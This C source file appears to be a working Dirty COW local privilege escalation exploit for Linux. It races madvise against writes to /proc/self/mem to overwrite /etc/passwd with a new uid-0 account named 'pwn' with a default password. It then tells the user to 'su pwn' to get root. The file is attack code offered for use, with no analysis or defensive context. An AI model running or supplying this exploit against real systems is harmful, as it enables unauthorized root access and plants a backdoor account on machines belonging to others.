#include <crypt.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define MAX	    32
#define TARGET_FILE "/etc/passwd"

int stop = 0;
struct stat st;
void *memory_map;
char *salt = "pwn";

struct user {
	char *name;
	char *pass;
	char *hash;
	int uid;
	int gid;
	char *shell;
};

void fill_user(struct user *u, char *pass) {

	if(pass == NULL)
		pass = "pwn123";

	u->name = "pwn";
	u->pass = pass;
	u->hash = crypt(pass, salt);
	u->uid = 0;
	u->gid = 0;
	u->shell = "/bin/sh";

}

void *madvise_func(void *arg) {

	int i;

	for(i=0; i<=10000000 && !stop; i++) {
		madvise(memory_map, MAX, MADV_DONTNEED);
	}

}

void *write_func(void *arg) {

	char *passwd_line = (char *)arg;
	int fd = open("/proc/self/mem", O_RDWR);
	int i;

	for(i=0; i<=10000000 && !stop; i++) {
		lseek(fd, memory_map, SEEK_SET);
		write(fd, passwd_line, MAX);
	}

}

void *check_func(void *arg) {

	char *passwd_line = (char *)arg;
	char buffer[MAX];
	int i;

	for(i=0; i<=10000000 && !stop; i++) {
		FILE *fp = fopen(TARGET_FILE, "r");
		fread(buffer, MAX, 1, fp);
		if(memcmp(passwd_line, buffer, MAX) == 0)
			stop = 1;
		fclose(fp);
		sleep(1);
	}

}

int main(int argc, char **argv) { 

	struct user u;
	pthread_t write_th, madvise_th, check_th;
	char passwd_line[MAX];
	int fd;	

	printf("[*] Backing up /etc/passwd to /tmp/passwd\n");
	system("cp /etc/passwd /tmp/passwd");

	fd = open(TARGET_FILE, O_RDONLY);
	fstat(fd, &st);

	memory_map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

	fill_user(&u, argv[1]);

	snprintf(passwd_line, MAX, "%s:%s:%d:%d:::%s", u.name, u.hash, u.uid, u.gid, u.shell);

	printf("[+] Generated passwd line: %s\n", passwd_line);
	printf("[*] Attempting to overwrite /etc/passwd\n\n");

	pthread_create(&write_th, NULL, &write_func, passwd_line);
	pthread_create(&madvise_th, NULL, &madvise_func, NULL);
	pthread_create(&check_th, NULL, &check_func, passwd_line);

	pthread_join(write_th, NULL);
	pthread_join(madvise_th, NULL);
	pthread_join(check_th, NULL);

	printf("[+] Succesfully added entry in /etc/passwd\n");
	printf("[+] Now you can 'su pwn' with password [%s] in order to get root\n\n", u.pass);

	return 0;

}
